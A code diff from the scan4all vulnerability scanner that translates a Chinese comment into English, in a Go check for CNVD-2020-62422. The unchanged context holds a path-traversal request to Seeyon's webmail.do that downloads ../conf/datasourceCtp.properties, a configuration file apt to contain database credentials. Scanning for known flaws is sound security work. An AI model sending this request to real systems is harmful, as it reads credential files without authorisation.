@@ -4,7 +4,7 @@ import (
 	"github.com/GhostTroops/scan4all/lib/util"
 )
 
-//webmail.do任意文件下载
+//webmail.do arbitrary file download
 
 func CNVD_2020_62422(u string) bool {
 	if req, err := util.HttpRequset(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", false, nil); err == nil {
